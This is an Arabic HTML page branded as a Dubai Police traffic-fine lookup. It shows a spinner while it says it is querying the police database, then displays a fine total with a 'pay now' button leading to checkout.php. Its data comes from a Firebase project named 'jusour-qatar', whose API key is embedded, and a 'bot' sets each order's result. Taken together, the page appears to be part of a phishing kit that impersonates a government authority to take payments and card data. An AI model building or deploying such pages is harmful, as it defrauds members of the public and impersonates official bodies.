<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>نتائج الاستعلام - شرطة دبي</title>
  <style>
    :root {
      --main-green: #008b47;
      --bg-color: #f4f7f6;
      --white: #ffffff;
    }

    * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
    body { margin: 0; padding: 0; background-color: var(--bg-color); font-family: 'Segoe UI', sans-serif; }

    /* هيدر ثابت */
    .header-fixed {
      position: fixed;
      top: 0;
      width: 100%;
      z-index: 2000;
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 10px 15px;
      background: linear-gradient(180deg, #008b47 0%, #4a4a4a 100%);
      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
    }

    .logo-container img { height: 45px; }

    .container {
      max-width: 480px;
      margin: 80px auto 0;
      padding: 20px 15px;
    }

    /* كارت الحالة */
    .status-card {
      background: #fff;
      border-radius: 20px;
      padding: 30px;
      text-align: center;
      box-shadow: 0 8px 25px rgba(0,0,0,0.08);
    }

    /* أنيميشن اللودر */
    .loader-ring {
      display: inline-block;
      width: 80px;
      height: 80px;
      border: 8px solid #f3f3f3;
      border-top: 8px solid var(--main-green);
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }

    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

    .status-title { font-size: 20px; font-weight: bold; color: #333; margin-bottom: 10px; }
    .status-msg { color: #666; font-size: 14px; line-height: 1.6; }

    /* كارت النتيجة (مخفي في البداية) */
    #resultBox {
      display: none;
      margin-top: 20px;
      background: #fff;
      border-radius: 20px;
      padding: 25px;
      border-right: 5px solid var(--main-green);
    }

    .amount-box {
      font-size: 32px;
      font-weight: 900;
      color: var(--main-green);
      margin: 15px 0;
    }

    .pay-btn {
      width: 100%;
      height: 55px;
      background: var(--main-green);
      color: #fff;
      border: none;
      border-radius: 25px;
      font-size: 18px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 15px;
    }
  </style>
</head>
<body>

<header class="header-fixed">
  <div style="width: 38px;"></div>
  <div class="logo-container">
    <img src="logo1.png" alt="Dubai Police">
  </div>
  <div style="width: 38px;"></div>
</header>

<div class="container">
  <div class="status-card" id="loadingCard">
    <div class="loader-ring"></div>
    <div class="status-title">جاري فحص المخالفات</div>
    <div class="status-msg">
      نحن نقوم الآن بالاتصال بقاعدة بيانات شرطة دبي المركزية لجلب بياناتك الحقيقية.. يرجى الانتظار ولا تقم بإغلاق الصفحة.
    </div>
  </div>

  <div id="resultBox">
    <div style="font-size: 14px; color: #666;">إجمالي مبلغ المخالفات المستحق:</div>
    <div class="amount-box" id="totalAmount">0.00 AED</div>
    <div id="violationDetails" style="font-size: 13px; color: #444; margin-bottom: 20px;"></div>
    <button class="pay-btn" onclick="window.location.href='checkout.php'">دفع المخالفات الآن</button>
  </div>
</div>

<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-analytics-compat.js"></script>

<script>
    // بيانات Firebase الحقيقية لمشروع jusour-qatar
    const firebaseConfig = {
      apiKey: "AIzaSyBRoLQJTQVVGiy9JntaEfWAA7qnPWoGLBI",
      authDomain: "jusour-qatar.firebaseapp.com",
      projectId: "jusour-qatar",
      storageBucket: "jusour-qatar.appspot.com",
      messagingSenderId: "927435762624",
      appId: "1:927435762624:web:11d0bf460b62e4af9db625",
      measurementId: "G-CSRM4QLNR9"
    };
    
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();
    const analytics = firebase.analytics();

    // استرجاع معرف الطلب من الجلسة
    const currentOrderId = sessionStorage.getItem("last_order_id");

    function listenForResults() {
        if (!currentOrderId) {
            console.error("No active order ID found");
            return;
        }

        // مراقبة الطلب الحالي فقط لضمان دقة البيانات
        db.collection("orders").doc(currentOrderId)
          .onSnapshot((doc) => {
            if (doc.exists) {
                const data = doc.data();
                
                // إذا قام البوت بتحديث الحالة إلى "completed"
                if (data.status === "completed") {
                    analytics.logEvent('fines_found', { amount: data.total_fines });
                    document.getElementById("loadingCard").style.display = "none";
                    document.getElementById("resultBox").style.display = "block";
                    document.getElementById("totalAmount").innerText = data.total_fines + " AED";
                    document.getElementById("violationDetails").innerText = "تم العثور على مخالفات مسجلة على اللوحة رقم: " + (data.number || "");
                } 
                // إذا لم توجد مخالفات
                else if (data.status === "no_fines") {
                    analytics.logEvent('no_fines_found');
                    document.getElementById("loadingCard").innerHTML = `
                        <div style="color: var(--main-green); font-size: 50px; margin-bottom:15px;">✓</div>
                        <div class="status-title">لا توجد مخالفات</div>
                        <div class="status-msg">لا توجد مخالفات مرورية مسجلة على هذه اللوحة في الوقت الحالي.</div>
                        <button class="pay-btn" style="background:#444; margin-top:20px;" onclick="window.location.href='index.php'">رجوع للرئيسية</button>
                    `;
                }
                // في حالة فشل البوت في جلب البيانات
                else if (data.status === "error") {
                    document.getElementById("loadingCard").innerHTML = `
                        <div style="color: #e74c3c; font-size: 50px; margin-bottom:15px;">!</div>
                        <div class="status-title">عذراً، حدث خطأ</div>
                        <div class="status-msg">لم نتمكن من جلب البيانات حالياً، يرجى المحاولة مرة أخرى لاحقاً.</div>
                        <button class="pay-btn" style="background:#444; margin-top:20px;" onclick="window.location.href='index.php'">رجوع</button>
                    `;
                }
            }
          });
    }

    // بدء الاستماع للنتائج فور تحميل الصفحة
    if (currentOrderId) {
        listenForResults();
    } else {
        // إذا دخل الصفحة مباشرة بدون طلب، يرجع للرئيسية
        window.location.href = "index.php";
    }
</script>
</body>
</html>
